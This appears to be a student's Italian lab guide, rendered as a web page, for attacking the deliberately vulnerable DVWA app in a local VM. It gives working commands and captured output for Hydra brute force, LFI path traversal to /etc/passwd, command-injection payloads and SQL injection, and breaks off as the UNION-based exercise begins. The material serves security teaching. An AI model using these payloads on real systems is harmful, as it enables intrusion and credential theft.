@@ -1,0 +1,559 @@
+<!doctype html>
+<html lang="it" data-tema="scuro">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>guida_lab_moduloS3_web_security.md · cockpit</title>
+<link rel="stylesheet" href="../assets/app.css">
+</head>
+<body>
+<a class="salta" href="#contenuto">Vai al contenuto</a>
+
+<header class="testata">
+  <a class="marchio" href="../index.html">cockpit</a>
+  <nav class="navigazione">
+    <a href="../index.html">Oggi</a>
+    <a href="../laurea.html">Laurea</a>
+    <a href="../corsi.html">Corsi</a>
+    <a href="../materiali.html" aria-current="page">Materiali</a>
+    <a href="../workflow.html">Workflow</a>
+    <a href="../diario.html">Diario</a>
+  </nav>
+  <div class="azioni">
+    <button type="button" class="cerca-apri" data-apri-ricerca>
+      <span>Cerca</span><kbd>Ctrl</kbd><kbd>K</kbd>
+    </button>
+    <button type="button" class="tema" data-cambia-tema aria-label="Cambia tema"></button>
+  </div>
+</header>
+
+<main id="contenuto" class="contenuto">
+<p class="metrica__etichetta">
+  archivio</p>
+<h1 class="titolo-pagina">guida_lab_moduloS3_web_security.md</h1>
+<p class="tenue"><a href="../../Vault/UniCode/ARCHIVIO/security_17-07_condensati/01_web_vulnerabilities/guida_lab_moduloS3_web_security.md">Apri il file originale</a></p>
+<article class="prosa"><h1 id="guida-lab-modulo-s3-web-security-dvwa">Guida Lab — Modulo S3: Web Security (DVWA)</h1>
+<p><strong>Corso</strong>: Lab Sicurezza Informatica T
+<strong>Materiale</strong>: <code>Web_security_6_marzo.pdf</code> (teoria, 45pp) + <code>LAB_web_security_11_marzo.pdf</code> (lab, 42pp)
+<strong>VM</strong>: <code>LabSicurezzaInformatica</code> in VirtualBox — Parrot OS
+<strong>Prerequisiti</strong>: S1 ✅ (nmap, ip a, gobuster), S2 ✅ (sessioni, cookie, autenticazione)</p>
+<hr />
+<h2 id="setup">Setup</h2>
+<blockquote>
+<p>⚠️ <strong>Snapshot obbligatorio</strong> prima di iniziare ogni sezione di sfruttamento.</p>
+</blockquote>
+<ol>
+<li>
+<p>Avvia la VM Parrot in VirtualBox.</p>
+</li>
+<li>
+<p>Verifica che nessun altro processo occupi la porta 80:</p>
+</li>
+</ol>
+<pre><code class="language-bash">sudo ss -tulpn
+</code></pre>
+<blockquote>
+<p>✅ Solo <code>udp/123</code> (ntpd) — nessun TCP in ascolto, porta 80 libera. Si può procedere.
+<code>ss -tulpn</code>: <code>-t</code> TCP, <code>-u</code> UDP, <code>-l</code> listening, <code>-p</code> processo, <code>-n</code> numerico. Ogni riga mostra indirizzo:porta e processo responsabile.</p>
+</blockquote>
+<p>Se appare nginx in ascolto sulla 80, fermalo:</p>
+<pre><code class="language-bash">sudo service nginx stop
+</code></pre>
+<ol start="3">
+<li>Avvia DVWA (primo avvio: scarica l'immagine Docker, alcuni minuti):</li>
+</ol>
+<pre><code class="language-bash">cd ~/pentestlab
+./pentestlab.sh start dvwa
+</code></pre>
+<p>Se <code>pentestlab</code> non è presente:</p>
+<pre><code class="language-bash">git clone https://github.com/eystsen/pentestlab.git &amp;&amp; cd pentestlab
+./pentestlab.sh start dvwa
+</code></pre>
+<blockquote>
+<p>⚠️ <code>http://dvwa</code> reindirizzato su HTTPS da Firefox → vedere <strong>Troubleshooting → Firefox reindirizza http://dvwa su HTTPS</strong>.
+⚠️ Con Podman: <code>./pentestlab.sh start dvwa</code> fallisce con errore registry → vedere <strong>Troubleshooting → Podman al posto di Docker</strong>.</p>
+</blockquote>
+<ol start="4">
+<li><strong>Prima configurazione DVWA</strong> (solo al primissimo avvio):
+   - Apri <code>http://dvwa</code> nel browser di Parrot
+   - Login: <code>admin</code> / <code>password</code>
+   - Vai su <strong>Setup</strong> → <strong>Create / Reset Database</strong>
+   - Vai su <strong>DVWA Security</strong> → seleziona <code>low</code> → <strong>Submit</strong></li>
+</ol>
+<blockquote>
+<p>✅ DVWA configurato: database creato, livello sicurezza <code>low</code>.</p>
+</blockquote>
+<ol start="5">
+<li>Verifica il tuo IP host (ti servirà per RFI e Hydra):</li>
+</ol>
+<pre><code class="language-bash">ip a
+</code></pre>
+<blockquote>
+<p>✅ IP host-only (per RFI e Hydra): <code>192.168.56.103</code> su <code>enp0s8</code>. IP container DVWA: <code>127.8.0.1</code> (port-forward Podman — vedere Troubleshooting). Output completo di <code>ip a</code> in Esercizio 1.
+⚠️ Gli IP nel PDF (.32/.33/.34/.5) sono esempi dell'anno scorso.</p>
+</blockquote>
+<hr />
+<h2 id="troubleshooting-setup">Troubleshooting Setup</h2>
+<h3 id="podman-al-posto-di-docker-parrot-os">Podman al posto di Docker (Parrot OS)</h3>
+<p>Parrot OS usa Podman come backend container, non Docker. Podman emula la CLI di Docker ma richiede il registry esplicito per le immagini.</p>
+<p><strong>Sintomo</strong>: <code>./pentestlab.sh start dvwa</code> termina con:</p>
+<pre><code>Error: short-name &quot;vulnerables/web-dvwa&quot; did not resolve to an alias
+</code></pre>
+<p><strong>Fix</strong> — esegui manualmente con registry completo:</p>
+<pre><code class="language-bash">sudo docker pull docker.io/vulnerables/web-dvwa
+sudo docker run --name dvwa -d -p 127.8.0.1:80:80 docker.io/vulnerables/web-dvwa
+</code></pre>
+<p>Verifica che il container sia attivo:</p>
+<pre><code class="language-bash">sudo docker ps
+# deve mostrare una riga con &quot;dvwa&quot; e STATUS &quot;Up&quot;
+</code></pre>
+<h3 id="es1-nmap-non-trova-il-container-podman">Es.1 — nmap non trova il container (Podman)</h3>
+<p>Con Podman, pentestlab espone DVWA su <code>127.8.0.1:80</code> — un indirizzo loopback. Gli indirizzi <code>127.x.x.x</code> non appaiono in nessun <code>nmap -sn</code> perché non viaggiano su interfacce di rete reali. La discovery nmap dell'Es.1 è pensata per Docker standard, dove il container ottiene un IP sul bridge <code>172.17.0.0/16</code>.</p>
+<p><strong>Con Podman</strong>: usa <code>127.8.0.1</code> come <code>IP_DVWA</code> direttamente (lo trovi in <code>/etc/hosts</code> o nell'output di pentestlab.sh). I comandi nmap dell'Es.1 diventano:</p>
+<pre><code class="language-bash">nmap -sT -p- 127.8.0.1
+nmap -sV -p 80 127.8.0.1
+</code></pre>
+<h3 id="firefox-reindirizza-httpdvwa-su-https">Firefox reindirizza http://dvwa su HTTPS</h3>
+<p>Firefox HTTPS-Only Mode upgrada automaticamente le URL HTTP.</p>
+<p><strong>Fix opzione 1</strong> — disabilita HTTPS-Only Mode:
+Impostazioni → Privacy e Sicurezza → "Modalità solo HTTPS" → seleziona "Non attivare"</p>
+<p><strong>Fix opzione 2</strong> — usa l'IP diretto (bypassa il problema):</p>
+<pre><code>http://127.8.0.1
+</code></pre>
+<p>pentestlab mappa <code>dvwa</code> a <code>127.8.0.1</code> in <code>/etc/hosts</code> — i due URL sono equivalenti.</p>
+<hr />
+<h2 id="threat-model">Threat Model</h2>
+<p><strong>Prospettiva attaccante</strong>: l'applicazione web non distingue tra <em>dato</em> e <em>istruzione</em>. Qualsiasi input controllato dall'attaccante che raggiunge un interprete — SQL, shell, JavaScript, XML parser — è potenzialmente armabile. Il lab segue le fasi di un pentest reale su web app: enumerazione servizi → directory discovery → brute force credenziali → sfruttamento vulnerabilità applicative (LFI, command injection, SQLi, XSS).</p>
+<p><strong>Prospettiva difensore</strong>: <em>validate input</em> (filtra e valida prima di usarlo), <em>escape output</em> (codifica HTML prima di echeggiarlo), usa <em>bind variables</em> per SQL (prepared statements), principio del minimo privilegio (www-data non dovrebbe leggere /etc/passwd), configura <em>HTTP security headers</em> (CSP, X-Frame-Options, HSTS).</p>
+<hr />
+<h2 id="esercizi">Esercizi</h2>
+<blockquote>
+<p>Lorenzo digita tutti i comandi. La guida li fornisce, non li esegue.</p>
+</blockquote>
+<hr />
+<h3 id="esercizio-1-service-enumeration">Esercizio 1 — Service Enumeration</h3>
+<p><strong>Obiettivo</strong>: scoprire l'indirizzo IP del container DVWA e le porte aperte sulla rete host-only.</p>
+<p><strong>Concetto</strong>: prima di attaccare bisogna sapere chi risponde dove. Su rete host-only si scansiona il subnet per trovare i nodi attivi, poi si verificano le porte aperte sul target.</p>
+<p><strong>Comandi</strong>:</p>
+<pre><code class="language-bash"># Trova il tuo IP host (prendi nota del subnet, es. 192.168.56.0/24)
+ip a
+
+# Scopri gli host attivi sulla rete (sostituisci con il tuo subnet)
+sudo nmap -sn 192.168.XX.0/24
+
+# Scansione porte TCP sul container DVWA trovato
+nmap -sT -p- IP_DVWA
+
+# Identificazione servizi sulle porte aperte
+nmap -sV -p 80,8080 IP_DVWA
+</code></pre>
+<blockquote>
+<p><strong><code>ip a</code> — interfacce attive:</strong>
+- <code>enp0s3 · 10.0.2.15/24</code> — NAT VirtualBox (uscita internet)
+- <code>enp0s8 · 192.168.56.103/24</code> — host-only (rete condivisa con l'host fisico)
+- <code>podman0 · 10.88.0.1/16</code> — bridge interno Podman (rete dei container)
+- <code>veth0@if2</code> — interfaccia virtuale del container DVWA su podman0 ✅ container attivo</p>
+<p>⚠️ Con Podman il container non è su <code>192.168.56.0/24</code> — accessibile via port-forward a <code>127.8.0.1</code>. Usa <code>127.8.0.1</code> come <code>IP_DVWA</code> (vedere Troubleshooting).</p>
+<p><strong>nmap -sT -p- 127.8.0.1</strong>:
+<code>PORT   STATE SERVICE
+80/tcp open  http</code>
+✅ Una sola porta aperta: TCP/80. Il container espone solo il web server, nessun altro servizio.
+"Not shown: 65534 closed" = tutte le altre porte hanno risposto con TCP RST (closed ≠ filtered).</p>
+<p><strong>nmap -sV -p 80,8080 127.8.0.1</strong>:
+<code>PORT     STATE  SERVICE    VERSION
+80/tcp   open   http       Apache httpd 2.4.25 ((Debian))
+8080/tcp closed http-proxy</code>
+✅ Apache 2.4.25 su Debian espone DVWA sulla porta 80. <code>-sV</code> legge il banner del servizio — senza di esso sai solo che la porta è aperta, non cosa gira sopra.
+8080 <code>closed</code>: Podman ha risposto con TCP RST — porta esistente ma nessun processo in ascolto. Nessun proxy o secondo web server attivo.</p>
+</blockquote>
+<p><strong>Anatomia dei comandi</strong>:
+- <code>ip a</code> — mostra tutte le interfacce con i loro indirizzi IP. Serve per conoscere il proprio IP e subnet prima di qualsiasi scansione.
+- <code>sudo nmap -sn &lt;subnet&gt;</code> — <em>ping scan</em>: invia ARP request (su rete locale) per scoprire quali host sono vivi senza scansionare porte. Richiede <code>sudo</code> per usare ARP; senza sudo usa ICMP, meno affidabile su rete locale.
+- <code>nmap -sT -p- IP</code> — TCP connect scan su tutte le 65535 porte (<code>-p-</code>). <code>-sT</code> completa la handshake TCP; non è stealth ma non richiede sudo. Ti dice <em>quali porte sono aperte</em>, non cosa gira.
+- <code>nmap -sV -p 80,8080 IP</code> — service/version detection: legge i banner dei servizi per identificare nome e versione. <code>-sV</code> fa "parlare" il servizio. Senza <code>-sV</code> sai solo che la porta è aperta.</p>
+<p>⚠️ <strong>Errore frequente</strong>: <code>-sT</code> vs <code>-sV</code> hanno funzioni diverse. <code>-sT</code> = stato porta (open/closed); <code>-sV</code> = servizio e versione. Per sapere "cosa gira sulla 80" serve <code>-sV</code>.</p>
+<p><strong>Cosa verificare</strong>: porta 80 aperta sul container; <code>http://IP_DVWA</code> nel browser mostra la login di DVWA.</p>
+<hr />
+<h3 id="esercizio-2-directory-discovering-gobuster">Esercizio 2 — Directory Discovering (gobuster)</h3>
+<p><strong>Obiettivo</strong>: trovare directory e file nascosti nell'applicazione web — path non linkati che possono esporre funzionalità admin, backup, configurazioni.</p>
+<p><strong>Concetto</strong>: security misconfiguration (A5) spesso lascia path accessibili che non compaiono nella navigazione normale. Un web content scanner li forza con una wordlist — ogni entry viene provata come path HTTP.</p>
+<p><strong>Comandi</strong>:</p>
+<pre><code class="language-bash">gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://dvwa
+</code></pre>
+<blockquote>
+<p>gobuster non esplora ricorsivamente le directory — è un <strong>brute-forcer di path</strong>: prende ogni parola da <code>big.txt</code> (es. <code>admin</code>, <code>config</code>, <code>phpmyadmin</code>) e costruisce <code>http://dvwa/&lt;parola&gt;</code>, mandando una richiesta HTTP per ciascuna. Se risponde 200/301/403 → path esiste; 404 → non esiste. Non segue link, non entra nelle cartelle trovate: scopre solo <em>quali path esistono</em> alla radice.</p>
+<p><strong>Output ottenuto</strong> (<code>http://127.8.0.1</code>):
+<code>/.htaccess            (Status: 403)
+/.htpasswd            (Status: 403)
+/README.md            (Status: 200)
+/config               (Status: 301) → http://127.8.0.1/config/
+/docs                 (Status: 301)
+/external             (Status: 301)
+/favicon.ico          (Status: 200)
+/robots.txt           (Status: 200)
+/server-status        (Status: 403)</code></p>
+<p><strong>Come leggere i codici HTTP</strong>:
+- <code>200</code> — esiste ed è accessibile in lettura
+- <code>301</code> — redirect: la directory esiste, Apache aggiunge lo slash finale
+- <code>403</code> — Forbidden: il server sa che esiste ma nega l'accesso
+- <code>404</code> — non esiste (gobuster li filtra di default — per questo non appaiono)</p>
+<p><strong>Cosa è interessante</strong>:
+- <code>/config</code> (301): contiene <code>config.inc.php</code> con credenziali del database — path da esplorare
+- <code>/README.md</code> (200): espone la versione di DVWA — informazione utile al ricognitore
+- <code>/server-status</code> (403): endpoint Apache mod_status — bloccato, ma se mal configurato esporrebbe statistiche interne del server
+- <code>/.htaccess</code> / <code>/.htpasswd</code> (403): il server li conosce ma li protegge; in caso di misconfiguration sarebbero leggibili</p>
+<p>⚠️ <code>/phpmyadmin</code> non trovato — questa immagine Docker non lo include. L'output atteso nella guida era basato su una versione diversa di DVWA.</p>
+</blockquote>
+<p><strong>Anatomia del comando</strong>:
+- <code>gobuster dir</code> — modalità directory/file brute-force (vs <code>dns</code> per sottodomini, <code>vhost</code> per virtual host).
+- <code>-w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt</code> — wordlist da provare come path. Su Parrot le SecLists stanno in <code>/usr/share/wordlists/</code>. <code>big.txt</code> è ampia e bilanciata per web content discovery.
+- <code>-u http://dvwa</code> — URL target. <code>dvwa</code> si risolve perché Docker configura l'hostname. Alternativa: <code>-u http://IP_DVWA</code> se la risoluzione non funziona.
+- Variante più veloce: <code>-t 50</code> aumenta i thread (default 10).</p>
+<p><strong>Output atteso</strong>:</p>
+<pre><code>/.htpasswd            (Status: 403)
+/.svn                 (Status: 301)
+/cgi-bin/             (Status: 403)
+/config               (Status: 301)
+/favicon.ico          (Status: 200)
+/phpmyadmin           (Status: 301)
+/robots.txt           (Status: 200)
+</code></pre>
+<p><strong>Cosa verificare</strong>: <code>/phpmyadmin</code> è esposto (A5 Security Misconfiguration — interfaccia admin del DB accessibile). <code>/config</code> può contenere file di configurazione con credenziali. <code>/robots.txt</code> può rivelare path che l'admin voleva nascondere.</p>
+<blockquote>
+<p><strong>Bonus — pagina Setup DVWA</strong> (<code>http://127.8.0.1/setup.php</code>):
+Rivela informazioni critiche senza autenticazione:
+- Percorso esatto del config: <code>/var/www/html/config/config.inc.php</code> → usarlo direttamente in Es.4 LFI
+- Credenziali DB parziali: utente <code>app</code>, database <code>dvwa</code>, host <code>127.0.0.1</code> (password nascosta ma leggibile via LFI)
+- <code>allow_url_include: Disabled</code> → RFI non funziona (confermato)
+- <code>allow_url_fopen: Enabled</code> → LFI funziona
+- <code>www-data</code> scrive in <code>/hackable/uploads/</code> → in scenari reali: upload webshell PHP + esecuzione via LFI
+- PHP 7.0.30 (EOL 2019) → versione con CVE noti
+Questa è A5 Security Misconfiguration: informazioni di sistema esposte senza autenticazione.</p>
+</blockquote>
+<hr />
+<h3 id="esercizio-3-brute-force-login-burp-hydra">Esercizio 3 — Brute Force Login (Burp + Hydra)</h3>
+<p><strong>Obiettivo</strong>: craccare le credenziali del form "Brute Force" di DVWA usando Burp per analizzare la request e Hydra per automatizzare l'attacco.</p>
+<p><strong>Concetto</strong>: il brute force su un form HTTP GET richiede di conoscere esattamente la struttura della request — parametri, cookie di sessione, stringa di fallimento. Burp intercetta la request per estrarre queste informazioni; Hydra le usa per iterare su username/password.</p>
+<p><strong>Comandi</strong>:</p>
+<p>Step 1 — Intercetta la request con Burp:</p>
+<pre><code># Avvia Burp Community Edition dal menu applicazioni
+# Usa le default settings + &quot;Temporary project&quot;
+# In Burp: Proxy → Intercept is ON
+# Apri il browser integrato di Burp (tasto &quot;Open Browser&quot; nel tab Proxy)
+#   ⚠️ Se il browser di Burp carica all'infinito: usa Firefox con proxy manuale
+#      Impostazioni Firefox → Rete → Proxy manuale → 127.0.0.1:8080
+# Vai su http://127.8.0.1/vulnerabilities/brute/ e digita &quot;prova&quot;/&quot;prova&quot; → Login
+# Burp intercetta la request — cerca la riga Cookie:
+#   Cookie: PHPSESSID=&lt;tuo_session_id&gt;; security=low
+# Nota il PHPSESSID — serve nel comando Hydra. Il cookie scade: riacquistalo ogni volta
+</code></pre>
+<p>Step 2 — Lancia Hydra con i dati catturati:</p>
+<pre><code class="language-bash">hydra 127.8.0.1 \
+  -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt \
+  -P /usr/share/wordlists/fasttrack.txt \
+  http-get-form \
+  &quot;/vulnerabilities/brute/index.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:H=Cookie\: PHPSESSID=&lt;tuo_session_id&gt;; security=low:Username and/or password incorrect.&quot;
+</code></pre>
+<p>Step 3 (bonus) — Genera wordlist contestuale da sito con cewl:</p>
+<pre><code class="language-bash">cewl -d 1 -m 5 https://ulisse.unibo.it
+</code></pre>
+<p><strong>Anatomia dei comandi</strong>:
+- <code>hydra &lt;IP&gt;</code> — target dell'attacco. Hydra prova ogni combinazione username/password contro il servizio specificato.
+- <code>-L &lt;file&gt;</code> — lista di username da provare. <code>-l admin</code> per un singolo username noto.
+- <code>-P &lt;file&gt;</code> — lista di password da provare. <code>fasttrack.txt</code> è pensata per attacchi rapidi su credenziali comuni (222 password); su Parrot: <code>/usr/share/wordlists/fasttrack.txt</code>.
+- <code>http-get-form</code> — modulo per form HTTP GET. Per POST: <code>http-post-form</code>.
+- La stringa ha formato <code>"path:parametri[:optional...]:condition_string"</code> — <strong>la condition va sempre ULTIMA</strong>:
+  - <code>^USER^</code> e <code>^PASS^</code> = placeholder sostituiti da Hydra per ogni tentativo
+  - <code>H=Cookie\: ...</code> = header custom (il <code>\:</code> escapa il due punti nell'header — è richiesto da Hydra 9.5)
+  - L'ultima stringa è il testo che appare quando il login <strong>fallisce</strong> — Hydra deduce il successo dalla sua assenza
+- <code>cewl -d 1 -m 5 &lt;url&gt;</code> — crawla il sito a profondità 1 estraendo parole di almeno 5 caratteri. Genera una wordlist contestuale: parole che l'amministratore del sito potrebbe usare come password.</p>
+<blockquote>
+<p>⚠️ <strong>Hydra 9.5 vs PDF</strong>: la guida del prof usa la sintassi <code>...condition:H=Cookie:...</code> (condition prima dell'header). In Hydra 9.5 il parser è cambiato: <strong>la condition string deve essere l'ultimo campo</strong>, dopo tutti gli optional (<code>H=</code>, <code>C=</code>, ecc.). La sintassi del PDF funziona su Hydra 8.x — su 9.5 produce parse error.</p>
+<p>⚠️ <strong>Il PHPSESSID nel comando Hydra è il TUO cookie di sessione attivo</strong>, non quello del PDF. Copialo da Burp ogni volta che lanci Hydra (scade alla chiusura della sessione browser).</p>
+</blockquote>
+<p><strong>Output atteso</strong>:</p>
+<pre><code>[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
+[DATA] attacking http-get-form://127.8.0.1:80/vulnerabilities/brute/...
+[80][http-get-form] host: 127.8.0.1   login: admin   password: password
+1 of 1 target successfully completed, 1 valid password found
+</code></pre>
+<p><strong>Cosa verificare</strong>: Hydra trova <code>admin</code>/<code>password</code>. Il form non ha rate limiting né lockout → A7 (Identification and Authentication Failures) confermato.</p>
+<hr />
+<h3 id="esercizio-4-file-inclusion-lfi-path-traversal">Esercizio 4 — File Inclusion (LFI / Path Traversal)</h3>
+<p><strong>Obiettivo</strong>: usare la vulnerabilità di File Inclusion per leggere file arbitrari del server tramite path traversal, poi simulare RFI.</p>
+<p><strong>Concetto</strong>: la pagina DVWA "File Inclusion" accetta un parametro <code>page=</code> passato direttamente a <code>include()</code> PHP senza filtri sull'input. LFI (Local File Inclusion) legge file locali del server; path traversal con <code>../</code> scala le directory fino alla radice. RFI (Remote File Inclusion) carica ed <em>esegue</em> file remoti — RCE via inclusion.</p>
+<p><strong>Comandi</strong>:</p>
+<p>LFI — leggi <code>/etc/passwd</code> via path traversal:</p>
+<pre><code># Nel browser, DVWA → File Inclusion
+# Modifica il parametro page= nella URL:
+http://127.8.0.1/vulnerabilities/fi/?page=../../../../../etc/passwd
+</code></pre>
+<blockquote>
+<p>⚠️ Servono <strong>5</strong> livelli <code>../</code>, non 4. La webroot è <code>/var/www/html/vulnerabilities/fi/</code> — cinque directory sopra c'è la radice <code>/</code>. Con 4 livelli si arriva a <code>/var/</code> → <code>/var/etc/passwd</code> non esiste → schermata vuota.</p>
+<p><strong>Output ottenuto</strong> — <code>/etc/passwd</code> del container:
+<code>root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+...</code>
+Cosa rivela:
+- <code>www-data</code> (UID 33) — utente con cui gira Apache/PHP; home <code>/var/www</code>; nessuna shell (<code>/usr/sbin/nologin</code>). Command injection o webshell girerebbe con questo UID.
+- <code>mysql</code> (UID 101) — MySQL è in esecuzione nel container, senza shell di login.
+- Nessun utente reale con <code>/bin/bash</code> tranne <code>root</code> — tipico container minimal.
+- Il file è leggibile da www-data → <strong>A1 Broken Access Control</strong> confermato: un parametro URL ha esposto un file di sistema senza autenticazione.</p>
+</blockquote>
+<p>RFI — includi file PHP remoto (richiede abilitazione manuale):</p>
+<pre><code class="language-bash"># Step 1: crea un file PHP di test su Parrot
+echo '&lt;?php echo &quot;&lt;p&gt;Hello World&lt;/p&gt;&quot;; ?&gt;' &gt; test.php
+
+# Step 2: servi il file con un web server HTTP sulla porta 8081
+python3 -m http.server 8081
+
+# Step 3: nel browser di DVWA (in un altro terminale)
+# http://dvwa/vulnerabilities/fi/?page=http://IP_PARROT:8081/test.php
+</code></pre>
+<p><strong>Anatomia dei comandi</strong>:
+- <code>../../../../../etc/passwd</code> — ogni <code>../</code> risale di un livello dalla webroot di DVWA (<code>/var/www/html/vulnerabilities/fi/</code>). Cinque livelli portano alla radice <code>/</code>, poi si accede a <code>/etc/passwd</code>. Il numero di <code>../</code> varia secondo la profondità della webroot; si prova incrementalmente finché non funziona.
+- <code>python3 -m http.server 8081</code> — avvia un web server HTTP minimale sulla porta 8081 nella directory corrente. Permette al server DVWA di raggiungere <code>test.php</code> via GET. Il modulo <code>http.server</code> è built-in Python — nessuna installazione.
+- <code>echo '&lt;?php ... ?&gt;' &gt; test.php</code> — crea un file PHP minimale come proof-of-concept. Se DVWA mostra "Hello World", ha scaricato e <em>eseguito</em> il PHP remoto (RFI con esecuzione). Se mostra il sorgente PHP, l'esecuzione remota è disabilitata.</p>
+<p>⚠️ <strong>RFI è disabilitato di default su DVWA</strong> (<code>allow_url_include = Off</code> in PHP). Il lab mostra il vettore teorico. In un sistema reale con PHP mal configurato, l'RFI permetterebbe RCE completo.</p>
+<p><strong>Cosa verificare</strong>: il contenuto di <code>/etc/passwd</code> appare nella pagina DVWA — hai letto un file di sistema tramite il solo parametro URL. A1 (Broken Access Control / File Disclosure) confermato.</p>
+<hr />
+<h3 id="esercizio-5-command-injection">Esercizio 5 — Command Injection</h3>
+<p><strong>Obiettivo</strong>: eseguire comandi di sistema arbitrari sul server abusando del form "ping" di DVWA.</p>
+<p><strong>Concetto</strong>: il codice PHP usa <code>exec()</code> per eseguire il comando ping concatenando direttamente l'input utente, senza filtrare i separatori bash. <code>;</code> esegue il secondo comando sempre (indipendentemente dall'exit code del primo); <code>&amp;&amp;</code> solo se il primo ha exit code 0. L'impatto è RCE con i privilegi del webserver (www-data).</p>
+<p><strong>Comandi</strong>:</p>
+<pre><code class="language-bash"># DVWA → Command Execution (Command Injection)
+# Inserire nel campo dell'indirizzo IP:
+
+127.0.0.1; ls
+# → ; esegue ls sempre, anche se ping fallisse
+
+127.0.0.1 &amp;&amp; ls
+# → &amp;&amp; esegue ls solo se ping 127.0.0.1 ha exit code 0
+
+; cat /etc/passwd
+# → senza IP iniziale: ping fallisce subito, poi cat legge utenti di sistema
+
+; id
+# → mostra l'utente con cui gira il webserver
+
+; uname -a
+# → informazioni sul kernel della macchina
+</code></pre>
+<p><strong>Anatomia dei payload</strong>:
+- <code>127.0.0.1; ls</code> — il PHP costruisce il comando <code>ping -c 4 127.0.0.1; ls</code>. Il <code>;</code> è un separatore bash: esegue i due comandi in sequenza, indipendentemente dall'exit code del primo. Funziona sempre.
+- <code>127.0.0.1 &amp;&amp; ls</code> — <code>&amp;&amp;</code> è condizionale: esegue <code>ls</code> solo se <code>ping</code> termina con successo (exit code 0). Se l'IP non risponde, <code>ls</code> non gira. Meno affidabile di <code>;</code> per l'attaccante.
+- <code>; cat /etc/passwd</code> — senza IP: il ping fallisce immediatamente, poi <code>cat</code> legge il file. Payload più diretto.
+- <code>; id</code> — rivela UID/GID del processo webserver. Ti dice se www-data ha privilege escalation possibile (es. appartenenza a gruppi insoliti).</p>
+<p>⚠️ <strong>Livello medium DVWA</strong> filtra <code>;</code> ma non <code>&amp;&amp;</code> → usare <code>&amp;&amp; ls</code> su difficoltà medium. Su low funzionano entrambi.</p>
+<p><strong>Output ottenuto</strong>:</p>
+<pre><code># Dopo &quot;127.0.0.1; ls&quot;:
+PING 127.0.0.1 (127.0.0.1) ...
+help  index.php  source
+
+# Dopo &quot;127.0.0.1; id&quot;:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<blockquote>
+<p><code>ls</code> ha listato i file nella directory corrente del processo: <code>/var/www/html/vulnerabilities/exec/</code>. Il server ha eseguito il comando — RCE confermato.
+<code>id</code> conferma che il processo gira come <code>www-data</code> (UID 33), non root. Non è privilegiato, ma può leggere file di config con credenziali DB, scrivere nella webroot, o aprire una reverse shell verso l'attaccante.</p>
+</blockquote>
+<p><strong>Cosa verificare</strong>: vedi l'output di comandi arbitrari nella pagina web — RCE confermato. Il processo gira come <code>www-data</code> (non root), ma dalla webroot potresti leggere file di config con credenziali del DB.</p>
+<hr />
+<h3 id="esercizio-6-sql-injection-semplice">Esercizio 6 — SQL Injection Semplice</h3>
+<p><strong>Obiettivo</strong>: alterare la logica della query SQL per ottenere tutti i record della tabella utenti invece di uno solo.</p>
+<p><strong>Concetto</strong>: il parametro <code>id</code> viene concatenato direttamente nella query PHP senza sanitizzazione. Un apostrofo nel payload rompe la stringa SQL; la condizione <code>OR 'a'='a</code> rende il WHERE always-true → tutti i record.</p>
+<p><strong>Perché funziona — il codice PHP</strong>:</p>
+<p>Il codice sorgente di DVWA (livello low) fa esattamente questo:</p>
+<pre><code class="language-php">$id = $_GET['id'];                          // prende l'input grezzo dalla URL
+$query = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id'&quot;;
+$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query);
+</code></pre>
+<p>Con input normale <code>1</code>, la query diventa:</p>
+<pre><code class="language-sql">SELECT first_name, last_name FROM users WHERE user_id = '1'
+</code></pre>
+<p>→ restituisce solo l'utente con ID 1.</p>
+<p>Con il payload <code>' OR 'a'='a</code>, la query diventa:</p>
+<pre><code class="language-sql">SELECT first_name, last_name FROM users WHERE user_id = '' OR 'a'='a'
+</code></pre>
+<ul>
+<li><code>'</code> — chiude la stringa aperta dal PHP (<code>WHERE user_id = '</code>). Ora il DB vede un valore vuoto per user_id.</li>
+<li><code>OR 'a'='a</code> — aggiunge una condizione always-true: <code>'a'='a'</code> è sempre verificato.</li>
+<li>Il WHERE diventa: "dammi le righe dove user_id è vuoto <strong>oppure</strong> 'a'='a'". La seconda condizione è sempre vera → <strong>tutte le righe</strong> della tabella.</li>
+<li>L'apostrofo finale del PHP (<code>'</code>) chiude il <code>'a</code> dell'ultimo <code>'a'</code> — la query è sintatticamente corretta senza bisogno di un commento <code>#</code>.</li>
+</ul>
+<p><strong>Comandi</strong>:</p>
+<pre><code># DVWA → SQL Injection, campo User ID
+
+' OR 'a'='a
+</code></pre>
+<p><strong>Output ottenuto</strong>:</p>
+<pre><code>ID: ' OR 'a' = 'a     First name: admin      Surname: admin
+ID: ' OR 'a' = 'a     First name: Gordon     Surname: Brown
+ID: ' OR 'a' = 'a     First name: Hack       Surname: Me
+ID: ' OR 'a' = 'a     First name: Pablo      Surname: Picasso
+ID: ' OR 'a' = 'a     First name: Bob        Surname: Smith
+</code></pre>
+<blockquote>
+<p>Tutti e 5 gli utenti del DB restituiti — la logica del WHERE è stata completamente bypassata. ✅</p>
+</blockquote>
+<p><strong>Cosa verificare</strong>: la pagina restituisce tutti gli utenti invece di uno — la logica del WHERE è stata bypassata. Questo funziona anche su form di login: <code>' OR '1'='1</code> bypassa l'autenticazione perché la query <code>WHERE password='...' OR '1'='1'</code> è always-true.</p>
+<hr />
+<h3 id="esercizio-7-sql-injection-union-based">Esercizio 7 — SQL Injection Union Based</h3>
+<p><strong>Obiettivo</strong>: estrarre credenziali dal database usando la tecnica UNION per aggiungere una seconda query alla query originale.</p>
+<p><strong>Concetto</strong>: <code>UNION SQL</code> concatena i risultati di due SELECT a patto che abbiano lo stesso numero di colonne. La logica è una ricognizione a imbuto in 4 passi — ogni passo usa le informazioni del passo precedente per sapere cosa chiedere dopo.</p>
+<p><strong>Il filo logico — perché ogni passo porta al successivo</strong>:</p>
+<pre><code>Passo 1: quante colonne ha la query originale?
+         → serve per costruire UNION valide (stesso numero di colonne)
+         ↓
+Passo 2: che DBMS è? che DB è attivo?
